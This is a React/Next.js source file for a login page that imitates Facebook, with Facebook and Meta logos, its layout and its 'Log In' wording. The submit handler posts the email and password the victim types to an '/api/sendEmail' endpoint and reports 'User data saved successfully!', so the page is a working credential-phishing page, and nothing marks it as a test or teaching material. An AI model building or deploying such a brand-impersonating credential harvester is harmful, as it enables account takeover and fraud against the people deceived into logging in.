"use client";
import { useState } from "react";
import Image from "next/image";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setMessage("");

    const formData = { email, password };

    try {
      const response = await fetch("/api/sendEmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        setMessage("User data saved successfully!");
      } else {
        setMessage("Failed to save user data.");
      }
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
    } catch (error) {
      setMessage("Network error occurred.");
    } finally {
      setLoading(false);
    }
  };

  return (
<div className="min-h-screen flex flex-col justify-center items-center bg-gradient-to-b from-gray-200 to-blue-100 relative">
  {/* Move the text to the top */}
  <div className="absolute top-6 text-gray-400 text-[8px]">English (UK)</div>

  <div className="p-8 rounded-lg w-96 text-center">
    {/* Facebook SVG Logo */}
    <Image
      src="/logos--facebook.svg"
      alt="Facebook"
      width={50}
      height={50}
      className="mx-auto mb-[40px] object-cover"
    />

    <form onSubmit={handleSubmit}>
      <div className="mb-4">
        <input
          type="email"
          placeholder="Mobile number or email address"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="w-full px-3 py-2 border text-black border-gray-300 rounded-[10px] focus:outline-none focus:ring-2 focus:ring-blue-500"
          required
        />
      </div>
      <div className="mb-6">
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="w-full px-3 py-2 border text-black border-gray-300 rounded-[10px] focus:outline-none focus:ring-2 focus:ring-blue-500"
          required
        />
      </div>
      <button
        type="submit"
        className={`w-full py-2 px-4 rounded-[20px] focus:outline-none focus:ring-2 focus:ring-blue-500 ${
          loading ? "bg-blue-400 cursor-not-allowed" : "bg-blue-600 hover:bg-blue-700"
        }`}
        disabled={loading}
      >
        {loading ? <span className="animate-pulse">Sending...</span> : "Log In"}
      </button>
    </form>
    {message && <p className="mt-4 text-sm text-gray-700 transition-opacity duration-500">{message}</p>}
  </div>

  {/* Meta logo */}
  <Image
    src="/lineicons--meta.svg"
    alt="Meta"
    width={50}
    height={50}
    className="object-cover text-gray-400"
  />

  {/* Footer Text Centered at the Bottom */}
  <div className="absolute bottom-6 left-1/2 transform -translate-x-1/2 text-gray-400 text-[8px]">
    About Help More
  </div>
</div>

  );
}
